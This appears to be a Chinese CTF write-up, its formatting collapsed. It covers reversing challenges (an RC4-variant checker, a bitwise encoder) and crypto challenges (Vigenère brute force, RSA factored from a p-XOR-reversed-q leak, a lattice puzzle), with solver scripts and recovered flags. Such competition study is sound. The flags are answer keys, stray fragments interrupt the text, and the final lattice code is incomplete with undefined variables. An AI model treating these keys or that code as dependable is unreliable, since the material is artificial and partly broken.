    // Generate keystream and process ciphertext    let (mut i, mut j) = (0u16, 0u16);    ciphertext        .iter()        .map(|&byte| {            i = (i + 1) % 256;            j = (j + s[i as usize] as u16) % 256;            s.swap(i as usize, j as usize);                        let k = s[((s[i as usize] as u16 + s[j as usize] as u16) % 256) as usize];            let k_rot = (k << 4) | (k >> 4);            (byte ^ (k_rot).wrapping_add(1)).wrapping_add(1)        })        .collect()}
fn main(){    println!("input your flag:");    let mut input = String::
new();    std::io::
stdin().read_line(&mut input);    let data = input.trim().as_bytes();
    // Process key (xor with index)    let mut key = vec![108u8, 110, 116, 102, 118, 112, 117, 115];    for i in 0..key.len() {        key[i] ^= i as u8;    }
    // Encrypt and check    let enc = crypt(data, &key);    let expected = vec![        0x29, 0x5, 0x13, 0xc, 0xe7, 0xa5, 0xd2, 0xa2, 0xa4, 0x3a, 0x3a, 0x5a, 0xbb, 0x23, 0x9c, 0xe4, 0xd7, 0x2, 0xbf    ];
    if enc == expected {        println!("right!!!");    } else {        println!("wrong...");    }}

def crypt(ciphertext: bytes, key: list[int]) -> list[int]:    s = list(range(256))    j = 0
    for i in range(256):        key_byte = key[i % len(key)] ^ 0x66        j = (j + s[i] + key_byte) % 256        s[i], s[j] = s[j], s[i]
    i = 0    j = 0    result = []
    for byte in ciphertext:        i = (i + 1) % 256        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]
        k = s[(s[i] + s[j]) % 256]        k_rot = ((k << 4) & 0xFF) | (k >> 4)        cipher_byte = (byte - 1) ^ (k_rot + 1)        cipher_byte &= 0xFF        result.append(cipher_byte)
    return result
key = [108, 110, 116, 102, 118, 112, 117, 115]for i in range(len(key)):    key[i] ^= idata = [0x29, 0x05, 0x13, 0x0c, 0xe7, 0xa5, 0xd2, 0xa2, 0xa4, 0x3a, 0x3a, 0x5a, 0xbb, 0x23, 0x9c, 0xe4, 0xd7, 0x02, 0xbf]enc = crypt(data, key)print(bytes(enc))#Y0uKn0wRu5tV@ryW@1l

go for it

#include<cstdint>#include<Windows.h>
uint8_trol(uint8_t v, int n){    return ((v << n) | (v >> (8 - n))) & 0xFF;}
uint64_tenc1(char* plain){    int i = 0;    uint64_t ret = 0;    uint8_t tmp1, tmp2;    uint8_t parts[8] = { 0 };    memcpy(parts, plain, 8);
    while (i < 4) {        tmp1 = parts[i] ^ parts[i + 2];        parts[i] = tmp1;        tmp2 = tmp1 ^ parts[i + 2] ^ parts[i + 1];        parts[i + 1] = tmp2;        parts[i + 2] ^= tmp2;        i += 3;    }
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)parts[i] << ((7 - i) * 8);    return ret;}
uint64_tenc2(uint64_t plain){    int64_t tmp = plain;    for (int i = 0; i < 64; i++)    {        if (tmp < 0)            tmp = (2 * tmp) ^ 0x2EF20D07161E85F7;        else            tmp *= 2;    }    return tmp;}
uint64_tenc3(uint64_t plain){    uint8_t parts[8] = { 0 };    uint8_t result[8] = { 0 };    uint64_t ret = 0;
    for (int i = 0; i < 8; i++)        parts[i] = (plain >> i * 8) & 0xFF;
    for (int k = 0; k < 8; k++)        for (int m = 0; m < 8; m++)            if (((0x80 >> k) & rol(parts[m], 5)) != 0)                result[k] |= 0x80 >> m;
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)result[i] << (i * 8);    return ret;}
intmain(){    uint64_t cipher[4] = { 0 };
    char input[] = "12345678876543211234567887654321";    for (int i = 0; i < 32; i += 8)        cipher[i / 8] = enc3(enc2(enc1(input + i)));
}

#include<cstdint>#include<stdio.h>#include<Windows.h>
uint8_tror(uint8_t v, int n){    return ((v >> n) | (v << (8 - n))) & 0xFF;}
voiddec1(uint64_t cipher, char* plain){    uint64_t ret = 0;    uint8_t tmp1, tmp2;    uint8_t parts[8] = { 0 };
    for (int i = 0; i < 8; i++)        parts[i] = cipher >> ((7 - i) * 8);
    int i = 0;    while (i < 4) {        tmp1 = parts[i];        tmp2 = parts[i + 1];        parts[i + 2] ^= tmp2;        parts[i + 1] = tmp1 ^ tmp2 ^ parts[i + 2];        parts[i] = tmp1 ^ parts[i + 2];        i += 3;    }    memcpy(plain, parts, 8);}
uint64_tdec2(uint64_t cipher){    int64_t tmp = cipher;    for (int i = 0; i < 64; i++)    {        if (tmp & 1)        {            tmp = (tmp ^ 0x2EF20D07161E85F7) / 2;            tmp |= 0x8000000000000000;        }        else            tmp = (uint64_t)tmp / 2;    }    return tmp;}
uint64_tdec3(uint64_t cipher){    uint8_t parts[8] = { 0 };    uint8_t result[8] = { 0 };    uint64_t ret = 0;
    for (int i = 0; i < 8; i++)        parts[i] = (cipher >> i * 8) & 0xFF;
    for (int k = 0; k < 8; k++)        for (int m = 0; m < 8; m++)            if (parts[k] & (0x80 >> m))                result[m] |= ror(0x80 >> k, 5);
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)result[i] << (i * 8);    return ret;}
intmain(){    char flag[33] = { 0 };
    uint64_t cipher[4] = { 0x8ADD5C04E5934C8, 0x199AC0E6DA4C2BC9, 0x0FF83F5E87D5510B5, 0x58447D6AD4E38B74 };
    for (int i = 0; i < 4; i++)        dec1(dec2(dec3(cipher[i])), flag + i * 8);
    puts(flag);}#5e28e27a835c4958b2d6dd186b21727a

crypto

因式分解

printf("hello world!");importstring
from secret import hintfrom secret import encrypt
import random
dicts = string.ascii_lowercase +"{=}"
key = (''.join([random.choice(dicts) for i in range(4)])) * 8
assert(len(hint) == 32)
assert(len(key) == 32)

cipher = encrypt(hint, key) 
print(cipher)
# cp=wmaunapgimjfpopeblvup=aywqygb

importstringimport itertools
dicts = string.ascii_lowercase + "{=}"# print(dicts)
# key = (''.join([random.choice(dicts) for i in range(4)])) * 8enc = 'cp=wmaunapgimjfpopeblvup=aywqygb'for k in itertools.product(dicts, repeat=4):    key = ''.join(k)      key=key*8    print(key)    numenc = [dicts.index(i) for i in enc]      numkey = [dicts.index(i) for i in key]      flag = ''    for i in range(len(enc)):        # assert len(numenc) == len(numkey)        ans = (numenc[i] - numkey[i % 4]) % 29          flag += dicts[ans]    if flag.startswith('tell'):        print(flag)        break
#tellasecret{a=secert}keepsilentt

from Crypto.Util.number import *from gmpy2 import*from secret import flag,a,b,c
m = bytes_to_long(flag)p = getPrime(256)q = getPrime(256)n = p * qe = 65537_q = int(bin(q)[2:][::-1] , 2)c = pow(m,e,n)
print('n =',n)print('c =',c)
'''n = 7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981c = 6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978'''
assert a**3+b**3+c**3 == 3*a*b*cgift = secert**3 - 9*secert + 8print(gift)
assert 3*(p ^ _q) == a + b + c
#16174454302590604301534105361719250538317088773024913985896374029052621214070408075926265229111851489902642328975085914458074453963086159246933939207642987161923181946601656883349077418380372857072224674380642689142603970810010050

25289672915296952421286820568694528489788342353673740247988495109991492893326

a=secert

根据gift = secert*3 – 9secert + 8，解方程得到a的值

import sympy
gift=16174454302590604301534105361719250538317088773024913985896374029052621214070408075926265229111851489902642328975085914458074453963086159246933939207642987161923181946601656883349077418380372857072224674380642689142603970810010050a = sympy.Symbol('a')f = a**3 - 9*a + 8-giftresult = sympy.solve([f],[a])print(result)
#25289672915296952421286820568694528489788342353673740247988495109991492893326

a^3+b^3+c^3 == 3abc

初中数学中那些好用的结论（一） – 知乎

若实数a、b、c满足 $a^3+b^3+c^3=3abc$ ，那么一定有 $a+b+c=0$ 或 $a=b=c$  。

3*(p ^ _q) == a + b + c,所以排除$a+b+c=0$，，得到$a=b=c$。

那么可知p ^ _q的值，剪枝就可以出来了

from Crypto.Util.number import *import sys
sys.setrecursionlimit(1500)
pxorq = 25289672915296952421286820568694528489788342353673740247988495109991492893326n = 7688109450918412752403544831281002390909833419780604228031807748258766149305710928557842935597759373483911172486806200079137977020089610947423466744079981c = 6470273779347221033316093386019083111753019159457126878637258794718443144439812725263309232245307744208957171971247518708231996986359926490571921925899978e = 65537pxorq = str(bin(pxorq)[2:]).zfill(256)

def find(ph, qh, pl, ql):    l = len(ph)    tmp0 = ph + (256 - 2 * l) * "0" + pl    tmp1 = ph + (256 - 2 * l) * "1" + pl    tmq0 = qh + (256 - 2 * l) * "0" + ql    tmq1 = qh + (256 - 2 * l) * "1" + ql    if (int(tmp0, 2) * int(tmq0, 2) > n):        return    if (int(tmp1, 2) * int(tmq1, 2) < n):        return    if (int(pl, 2) * int(ql, 2) % (2 ** (l - 1)) != n % (2 ** (l - 1))):        return
    if (l == 128):        pp0 = int(tmp0, 2)        if (n % pp0 == 0):            pf = pp0            qf = n // pp0            print(pf)            print(qf)            phi= (pf-1)*(qf-1)            d = inverse(e,phi)            m = pow(c,d,n)            print(long_to_bytes(m))
    else:        if (pxorq[l] == "1"and pxorq[255 - l] == "1"):            find(ph + "1", qh + "0", "1" + pl, "0" + ql)            find(ph + "0", qh + "0", "1" + pl, "1" + ql)            find(ph + "1", qh + "1", "0" + pl, "0" + ql)            find(ph + "0", qh + "1", "0" + pl, "1" + ql)        elif (pxorq[l] == "1"and pxorq[255 - l] == "0"):            find(ph + "1", qh + "0", "0" + pl, "0" + ql)            find(ph + "0", qh + "0", "0" + pl, "1" + ql)            find(ph + "1", qh + "1", "1" + pl, "0" + ql)            find(ph + "0", qh + "1", "1" + pl, "1" + ql)        elif (pxorq[l] == "0"and pxorq[255 - l] == "1"):            find(ph + "0", qh + "0", "1" + pl, "0" + ql)            find(ph + "0", qh + "1", "0" + pl, "0" + ql)            find(ph + "1", qh + "0", "1" + pl, "1" + ql)            find(ph + "1", qh + "1", "0" + pl, "1" + ql)        elif (pxorq[l] == "0"and pxorq[255 - l] == "0"):            find(ph + "0", qh + "0", "0" + pl, "0" + ql)            find(ph + "1", qh + "0", "0" + pl, "1" + ql)            find(ph + "0", qh + "1", "1" + pl, "0" + ql)            find(ph + "1", qh + "1", "1" + pl, "1" + ql)

find("1", "1", "1", "1")

flag = b’flag{80a59062-9bbf-99a3-6af0-a24e94032163}’

Lattice

from Crypto.Util.number import *from Crypto.Cipher import AESimport osfrom secret import flagimport numpy as np

def gen(q, n, N, sigma):    t = np.random.randint(0, high=q // 2, size=n)    s = np.concatenate([np.ones(1, dtype=np.int32), t])    A = np.random.randint(0, high=q // 2, size=(N, n))    e = np.round(np.random.randn(N) * sigma**2).astype(np.int32) % q    b = ((np.dot(A, t) + e).reshape(-1, 1)) % q    P = np.hstack([b, -A])    return P, s

def enc(P, M, q):    N = P.shape[0]    n = len(M)    r = np.random.randint(0, 2, (n, N))    Z = np.zeros((n, P.shape[1]), dtype=np.int32)    Z[:, 0] = 1    C = np.zeros((n, P.shape[1]), dtype=np.int32)    for i in range(n):        C[i] = (np.dot(P.T, r[i]) + (np.floor(q / 2) * Z[i] * M[i])) % q    return C

q = 127n = 3N = int(1.1 * n * np.log(q))sigma = 1.0
P, s = gen(q, n, N, sigma)

def prep(s):    return np.array([int(b) forchar in s for b in f"{ord(char):
08b}"], dtype=np.int32)

C = enc(P, prep(hint), q)P = P.tolist()C = C.tolist()print(f"{P=}")print(f"{C=}")
'''P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]'''
key = os.urandom(16)encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(b"".join([pad(i.encode(), 16) for i in flag]))
print(leak)print(key)print(encrypted)
